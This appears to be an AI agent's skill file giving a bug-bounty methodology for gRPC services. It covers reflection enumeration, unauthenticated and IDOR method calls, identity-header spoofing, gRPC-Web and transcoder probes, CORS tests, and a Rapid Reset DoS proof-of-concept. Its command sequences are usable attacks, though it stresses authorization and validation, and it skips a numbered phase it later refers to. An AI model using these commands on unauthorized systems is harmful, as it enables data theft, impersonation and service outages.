---
name: grpc
description: "Hunt gRPC vulnerabilities — server reflection enabled (enumerate all services/methods), missing authentication / metadata-stripping on internal endpoints, plaintext gRPC over HTTP/2, internal endpoint disclosure, proto file leakage, gRPC-Web/grpc-gateway transcoding injection, and HTTP/2 Rapid Reset DoS (CVE-2023-44487). Use when target exposes port 50051 / 443 / 8443 / 9090 with HTTP/2, when grpcurl/grpcui detects reflection, when an Envoy or grpc-gateway proxy is fronting a microservice, or when recon reveals a microservice architecture."
---

# HUNT-GRPC — gRPC Security

**Reference files (load on demand):**

- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Crown Jewel Targets

gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is "internal" — auth is enforced at the edge proxy, and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses.

**Highest-value findings:**
- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).
- **Missing auth on internal service** — a service designed for east-west microservice traffic exposed externally with no mTLS and no per-method authorization → call privileged methods directly.
- **Edge-auth-only / metadata-stripping** — proxy authenticates the user but the backend re-trusts proxy-injected headers (`x-user-id`, `x-tenant-id`, `x-forwarded-*`); if you reach the backend or can inject those headers via the proxy, you impersonate any tenant.
- **Plaintext gRPC** — gRPC h2c (cleartext HTTP/2) on a non-standard port → credential/metadata interception.
- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — interleaved HEADERS + immediate RST_STREAM frames bypass `MAX_CONCURRENT_STREAMS` accounting → resource exhaustion. **DoS is in scope on almost no program — get explicit written authorization before sending a single burst.**

---

## Phase 1 — Fingerprint & Port Discovery

```bash
# Common gRPC ports (50051 native; 443/8443 via TLS+ALPN h2; 9090/8080 h2c)
nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET 2>/dev/null | grep open

# ALPN must negotiate h2 — gRPC cannot run on HTTP/1.1
echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"

# Native-gRPC fingerprint: an HTTP/2 POST to a bogus method returns a grpc-status
# trailer (12 = UNIMPLEMENTED) even when the path is wrong — strong signal it's gRPC.
curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" \
  -H "content-type: application/grpc" -o /dev/null -D - | grep -i grpc-status

# TLS-fronted h2 (port 443): look for grpc-status trailer / grpc content-type
curl -s --http2 -X POST "https://$TARGET/grpc.health.v1.Health/Check" \
  -H "content-type: application/grpc-web+proto" -o /dev/null -D - | grep -i "grpc-status\|content-type"
```

`grpc-status` trailer present ⇒ a gRPC server (or grpc-gateway/Envoy) is behind that port. `UNIMPLEMENTED` on a random path is normal and only confirms the transport — not a finding.

---

## Phase 2 — Service Enumeration via Reflection

```bash
brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
grpcurl -plaintext $TARGET:50051 list
grpcurl -insecure  $TARGET:443   list

# Typical output when reflection is on:
#   grpc.reflection.v1.ServerReflection
#   grpc.health.v1.Health
#   user.UserService
#   admin.AdminService
#   payment.PaymentService

# List + describe every method of each service
grpcurl -plaintext $TARGET:50051 list admin.AdminService
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema

# Dump the whole catalog to triage interesting surfaces
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
```

**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary.

---

## Phase 3 — Call Methods Without Authentication (authz testing)

```bash
# Baseline: call a sensitive method with NO auth metadata
grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers

# IDOR across an enumerable id field
for ID in 1 2 3 100 1000 1001; do
  echo "id=$ID"; grpcurl -plaintext $TARGET:50051 \
    -d "{\"user_id\": $ID}" user.UserService/GetUser 2>&1 | head -4
done
```

**Interpret the gRPC status code, not just whether bytes came back (see Validation):**
- `OK` + populated response → method executed unauthenticated → finding.
- `Unauthenticated (16)` / `PermissionDenied (7)` → authz is enforced; NOT a finding.
- `Unimplemented (12)` → wrong path / method not on this server.
- `InvalidArgument (3)` → reached and parsed your input → method is callable; fix the payload and retry.

---

## Phase 5 — Proto File / Schema Discovery

```bash
# Proxies (Envoy/grpc-gateway) sometimes serve descriptors or swagger
for P in proto api/proto swagger.json openapiv2 service.swagger.json descriptor.pb; do
  S=$(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET/$P")
  [ "$S" != 404 ] && echo "Found: /$P ($S)"
done

# Source/registry leakage of .proto definitions
gh search code --owner "$TARGET_ORG" 'syntax = "proto3"' --limit 20 2>/dev/null
gh search code --owner "$TARGET_ORG" 'service ' filename:.proto --limit 20 2>/dev/null

# Rebuild a descriptor set from leaked protos and drive the API without reflection
protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto
grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list
```

Proto leakage on its own is low severity; its value is as the key that unlocks Phases 3–4 against a reflection-disabled target.

---

## Phase 6 — gRPC-Web / grpc-gateway / JSON-Transcoding Attacks

gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web`/`grpc_json_transcoder`**, **grpc-gateway** (REST↔gRPC), or **Connect**. These translators are the realistic external attack surface and frequently re-expose internal methods.

```bash
# (a) grpc-gateway maps gRPC methods to REST. Reflection-derived method names often
#     map predictably — hit them over plain HTTP/JSON (no gRPC client needed):
curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'
curl -s -X POST "https://$TARGET/admin.AdminService/ListUsers" \
  -H 'content-type: application/json' -d '{}'    # default unannotated route

# (b) Build a real gRPC-Web length-prefixed frame instead of a hand-waved one.
#     Frame = 1-byte flag (0x00=data) + 4-byte big-endian length + protobuf payload.
#     Encode the message with protoscope so the bytes are correct:
#       protoscope -s <<<'1: 1'  > msg.bin          # field 1 (e.g. user_id) = 1
MSG=$(xxd -p msg.bin | tr -d '\n')
LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix
FRAME=$(printf '00%s%s' "$LEN" "$MSG")
echo "$FRAME" | xxd -r -p > frame.bin
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
  --data-binary @frame.bin | xxd | head

# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
  -d '{"user_id": 1}'

# (d) Connect protocol (buf): plain JSON POST, unary, no framing:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
  -d '{"user_id": 1}'
```

Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If the transcoder route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated/low-priv user (not just from inside the mesh).

---

## Phase 7 — HTTP/2 Rapid Reset DoS (CVE-2023-44487)

**Authorization gate:** DoS is out of scope on the overwhelming majority of programs. Do NOT run this without explicit, written, scoped permission and a target/window the program owner agreed to. Skip to Validation if unsure.

The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it — the client races far ahead of the concurrency cap. `h2load`/`ghz` are throughput benchmarkers; **they have no rapid-reset mode and never interleave HEADERS+immediate-RST_STREAM, so they cannot test this.**

**Correct tooling — author-sanctioned PoCs that actually emit the frame pattern:**
```bash
# CERT/CC + community tracking and PoCs for CVE-2023-44487:
#   https://kb.cert.org/vuls/id/421644
#   https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/  (Cloudflare writeup)
# Go PoC that sends HEADERS then immediate RST_STREAM in a tight loop:
git clone https://github.com/secengjeff/rapidresetclient
cd rapidresetclient && go build -o rapidreset .
# Detection-only: a SHORT, low-count burst, with permission, then STOP:
./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:
# ./rapidreset -url https://$TARGET:443 -concurrency 1 -requests 20

# If you must roll your own, use the h2 framing layer (golang.org/x/net/http2)
# to write a HEADERS frame immediately followed by RST_STREAM(CANCEL) per stream id.
```

**Detection without DoSing — prefer this:** the only thing you need to PROVE is whether mitigations are present. Check the server banner / version and whether it tracks reset floods:
```bash
# Fingerprint the HTTP/2 implementation and version (patched versions are known):
curl -sI --http2 https://$TARGET/ | grep -i '^server:'
# nghttp2 >=1.57.0, Go net/http with the 2023-10 fix, Envoy >=1.27.1/1.26.5/1.25.10/1.24.11,
# grpc-go >=1.56.3/1.57.1/1.58.3 are mitigated. Version-match instead of flooding.
```
Report the *version-confirmed* mitigation gap rather than a benchmark slowdown. "Server got slower under load" is not proof of CVE-2023-44487 — it produces false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully.

---

## Tools

```bash
grpcurl   # primary CLI client (list/describe/call, -protoset for reflection-off)
grpcui    # web UI for interactive exploration:  grpcui -plaintext $TARGET:50051
protoc + protoscope   # build/inspect raw protobuf and gRPC-Web frames (Phase 6)
buf       # lint/inspect proto, drive Connect endpoints
# DoS-only, AUTHORIZED engagements: secengjeff/rapidresetclient (true rapid-reset PoC).
#   NOTE: ghz and h2load are LOAD benchmarkers, NOT rapid-reset testers — do not
#   use them to "prove" CVE-2023-44487.
```

---

## Chain Table

| gRPC finding | Chain to | Impact |
|--------------|----------|--------|
| Reflection enabled | Enumerate all internal service methods + messages | Full API catalog disclosure (enabler) |
| Admin method, no auth | Call privileged RPCs (`DeleteUser`, `GetConfig`) | Data manipulation / system access — Critical |
| Proxy forwards `x-user-id`/`x-tenant-id` unstripped | Spoof identity metadata → cross-tenant impersonation | Tenant isolation bypass — Critical |
| IDOR via enumerable id field | Iterate `user_id` over `GetUser` | Mass PII exfil — High |
| grpc-gateway / gRPC-Web route re-exposes internal RPC | Hit transcoded REST/JSON path unauth | Externally-reachable authz bypass — High/Critical |
| Plaintext h2c on internal port | MITM / sniff metadata (bearer tokens) | Credential capture — High |
| `.proto` leak (repo/swagger) | `-protoset` to drive reflection-off target | Unlocks Phases 3–4 — Low alone, High as enabler |

Related skills: **idor** (id enumeration logic), **api-misconfig** (JWT alg=none / mass-assignment in request messages), **auth-bypass** (edge-vs-backend trust boundary), **tls-network** (h2c/plaintext + ALPN), **cloud-iam-deep** (if a called RPC returns cloud creds).

---

## Validation — false-positive discipline

gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.

1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.

2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.

3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).

4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.

5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **ssrf**.

6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.

**Severity guide (after the gates above pass):**
- Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
- Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
- IDOR / mass PII via enumerable RPC → **High**
- Internal service externally reachable (transcoder or open port) → **High**
- Plaintext h2c leaking bearer metadata → **High**
- Reflection enabled exposing non-public catalog → **Medium** (enabler)
- Proto/descriptor leak, no callable sensitive method → **Low**

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Fingerprint by content-type and trailers** (OWASP WSTG WSTG-APIT-10): requests with `application/grpc`, `application/grpc-web`, `application/grpc-web-text`; responses with `grpc-status` / `grpc-message` trailers; POST paths of the form `/<package>.<Service>/<Method>` (e.g. `/shop.v1.OrderService/GetOrder`). Generated gRPC-Web client code in JS bundles leaks service paths and often message field names/numbers.
- Probe **all entry points**, because controls are frequently applied to only one: native gRPC (port 50051 / h2), gRPC-Web through Envoy/APISIX/grpcwebproxy, and REST/JSON transcoding via `google.api.http` annotations (grpc-gateway, cloud API gateways). Ask specifically: can the native port be reached directly, bypassing the gateway's auth/rate limits?
- **Reflection first**: `grpcurl <host>:443 list`, `... describe <pkg>.<Service>`, `... describe .<pkg>.<RequestMessage>` (leading dot = fully qualified type). Success means full API inventory. Note any `admin`, `debug`, `internal`, `migration` methods the browser client never calls.
- **Built-in services** to check explicitly (WSTG): `grpc.reflection.v1.ServerReflection` and legacy `grpc.reflection.v1alpha.ServerReflection`, `grpc.health.v1.Health` (can reveal internal service names), and `grpc.channelz.v1.Channelz` (debug: internal channels, connections, peer addresses). Reflection in production is an enabler, not by itself a vuln — but Channelz exposure is often reportable.
- **Reflection disabled? Work blind**: `.proto`/descriptor sets from JS bundles, mobile apps, public repos, SDKs; decode captured protobufs with Burp's **Blackbox Protobuf** extension (infers field types without a schema); brute-force method paths with `Get/List/Create/Update/Delete/Admin*` wordlists. grpc-status 12 (UNIMPLEMENTED) cleanly distinguishes "no such method" from status 3 (INVALID_ARGUMENT) / 16 (UNAUTHENTICATED).
- Enumerate **all four call types** per service: unary, server-streaming, client-streaming, bidirectional. OWASP's gRPC CS explicitly notes that a unary auth interceptor does **not** protect streaming RPCs — many libraries register interceptors separately.
- Inspect **metadata** keys as a trust boundary: `authorization: Bearer ...`, `x-api-key`, `x-user-id`, `x-tenant-id`, `x-forwarded-user`, `cookie: session=...`, and binary keys with the `-bin` suffix (grpcurl base64-decodes them). A gateway that is supposed to overwrite identity metadata but forwards client-supplied values is an auth bypass.
- If grpc-gateway is present, know the header-matching rules: the default matcher forwards `Authorization`, `Cookie`, `User-Agent` as `grpcgateway-*` plus bare `authorization`; legacy `Grpc-Metadata-<key>` forwarding was CVE-2026-18972 (client chose metadata keys read as trusted by the backend). Test both old and new mux behavior.
- Note **proto3 presence semantics**: non-`optional` scalars with implicit presence default to `0`/`false`/`""` and are indistinguishable from an explicitly sent default. Fields declared `optional`, in `oneof`, or message-typed track presence. This matters for zero-amount and empty-ID bypasses.
- Probe **deadlines and `grpc-timeout`**: a client that sets no deadline can hold server resources; an excessively long or absent server-side timeout is a resource-exhaustion primitive. Compare behavior with `grpc-timeout: 1n` vs. a multi-minute value.
- Check **`grpc-encoding` / compression** on requests: send a small compressed message that expands to a huge payload and see whether `MaxRecvMsgSize` is enforced before or after decompression (zip-bomb class).
- Fingerprint the implementation from `grpc-status` / `grpc-message` wording and error details (`google.rpc.DebugInfo`, `BadRequest`, `Help`) — rich details often leak stack traces, internal service names, and library versions.
- Check whether both reflection versions are registered — `grpc.reflection.v1.ServerReflection` and the deprecated `grpc.reflection.v1alpha.ServerReflection`. Some proxies route one but not the other; v1alpha can remain exposed after a "we disabled reflection" fix.
- When a transcoder is present, map every `google.api.http` route from the descriptor back to a gRPC method and verify auth parity on both paths. Note any route whose HTTP verb differs from the RPC's semantics (e.g. a state-changing method exposed via `GET`).
- Establish a size baseline: send the smallest valid message for each method, then a 4 MiB+ message. A server that accepts far more than the typical 4 MiB `MaxRecvMsgSize` (or that returns a rich error describing the limit) is misconfigured and gives you a resource-exhaustion primitive.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Authz matrix**: for every discovered method × every call type × every entry point, call (a) with no metadata, (b) expired token, (c) low-privileged user's token. A `grpcurl -plaintext target:50051 pkg.AdminService/DeleteUser` that succeeds with no metadata is direct BFLA.
- **Interceptors vs. call types**: if unary calls are denied but a server-streaming equivalent accepts the same token, report the streaming method as the unauthenticated surface; OWASP recommends a stream interceptor plus per-message checks.
- **Metadata spoofing**: `grpcurl -H 'x-user-id: 1' -H 'x-is-admin: true' ... pkg.v1.Svc.Method` — if the backend trusts gateway-populated identity headers, this is complete impersonation. Also try `-H 'cookie: session=<victim>'` and `-H 'authorization-bin: <base64>'`.
- **Token validation differential** (same JWT attacks as REST, carried in metadata): `alg:none`, expired `exp`, swapped `kid`, and another user's signed token. grpc itself does nothing with the token — validation is app-side.
- **mTLS is not authz**: `grpcurl -insecure` succeeding without a client cert means mTLS isn't enforced; conversely, a channel-authenticated workload can still be a confused deputy if per-method authorisation is missing. Distinguish `UNAUTHENTICATED` (credential rejected) from `PERMISSION_DENIED` (credential accepted, role insufficient).
- **Mass assignment in protobuf**: set fields the client "shouldn't" send — `role`, `owner_id`, `price`, `verified`. For update methods using `google.protobuf.FieldMask`, add protected fields to the mask. Unused fields in the request message are applied if the server binds them blindly.
- **Proto validation gaps**: send negative values to signed ints, very large integers, and **undefined enum values** (proto3 accepts them; the app must reject). Combine with default-presence tricks (`id: 0`, empty string) to bypass lookups.
- **Injection through fields**: string/bytes fields reach SQL, shells, and templates — run the normal injection payloads through `grpcurl -d '{"field":"..."}'` or a transcoded JSON endpoint.
- **grpc-gateway `DiscardUnknown`**: by default unknown JSON fields are silently dropped with a `200 OK` — a token/tenant/signature field a client expects the gateway to forward can vanish. Set `UnmarshalOptions.DiscardUnknown=false` locally to see whether the field is rejected (`400 unknown field`) vs. silently discarded on the target. This is a real semantic gap worth testing on signed/tenant-routed requests.
- **JSON transcoding path probe**: `curl -i https://host/pkg.svc.Method -H 'Content-Type: application/json' -d '{"field":"value"}'` — transcoders may expose methods with weaker auth than the gRPC path. Watch for `x-envoy-original-path` and other proxy-added headers that upstreams may trust.
- **gRPC-Web CORS**: preflight with `Origin: https://evil.tld`, `Access-Control-Request-Headers: content-type,x-grpc-web,x-user-agent,grpc-timeout`. Reflected origin + `Access-Control-Allow-Credentials: true` enables cross-site authenticated gRPC-Web calls. Check `Access-Control-Expose-Headers` includes `grpc-status`/`grpc-message`.
- **Transport comparison**: call the same method through gRPC-Web and native gRPC with identical credentials/message; compare grpc-status, data, rate limits. A policy difference is a finding only after confirming the selected route — don't report a different response format alone.
- **Status-code oracle**: compare NOT_FOUND vs PERMISSION_DENIED for existing/non-existing objects to enumerate identifiers. Inspect `grpc-message` and `grpc-status-details-bin` (e.g. `google.rpc.DebugInfo`) for stack traces.
- **Resource probes**: oversized messages, many messages on one stream, no client deadline, and compressed messages (`grpc-encoding: gzip`) — check whether the size limit is applied *after* decompression and whether streams can be held open indefinitely.

### C. Validation / proof bar — how to confirm and avoid false positives

- Reflection enabled is an **enabler**, not a vulnerability. Report a callable sensitive method, metadata trust bypass, or leaked internal service — not "reflection is on" by itself (WSTG and OWASP agree).
- For each authz claim, show the exact method path, call type, entry point, and metadata used, plus a successful response containing another user's or admin-only data. An `UNAUTHENTICATED` error from a method you had no right to call is not a finding.
- Confirm gateway-vs-native differences on the **same method with the same credentials**; a format-only difference is expected. Verify the route/upstream before calling it a bypass (WSTG / Envoy issue caveat).
- For metadata spoofing, prove the header reached the backend and changed authorization — not merely that it was accepted by the proxy. Compare with a control request where the header is absent.
- For `DiscardUnknown` findings, demonstrate that a security-relevant field actually disappeared and the request still succeeded with a `200`; a missing *cosmetic* field is not a vulnerability.
- For CORS on gRPC-Web, show a credentialed cross-origin call from a browser (preflight + actual request) producing sensitive data — header reflection alone is informational per the CORS skill's bar.
- Treat DoS/resource tests as authorized-only: use a single bounded oversized message or short stream, capture latency/error behavior, and stop. Never run sustained stream floods on a live program.
- For stream-authz claims, keep the stream open past the point where the victim's token would expire and re-send a privileged message. A server that validated only at stream creation will keep serving an expired/removed user — this is a distinct finding from missing method auth.
- When reporting a mass-assignment/FieldMask case, include the reflection-derived message definition showing the protected field exists, plus the before/after value from an authorized `Get` call. Binary responses don't self-document.
- Note binary-format pitfalls in reports: include the decoded JSON form (`grpcurl -d '{...}'`) and the reflection-derived message definition so triagers can replay without reverse-engineering protobuf bytes.

### D. Sources — numbered list of URLs you actually fetched

1. https://wstg.owasp.org/latest/16-API_Testing/10-gRPC/
2. https://cheatsheetseries.owasp.org/cheatsheets/gRPC_Security_Cheat_Sheet.html
3. https://grpc.io/docs/guides/reflection/
4. https://grpc.io/docs/guides/auth/
5. https://hacktricks.wiki/en/pentesting-web/grpc-web-pentest.html
6. https://grpc-ecosystem.github.io/grpc-gateway/docs/operations/security_considerations/
7. https://www.securify.nl/en/blog/security-assessing-grpc-grpc-web-services/
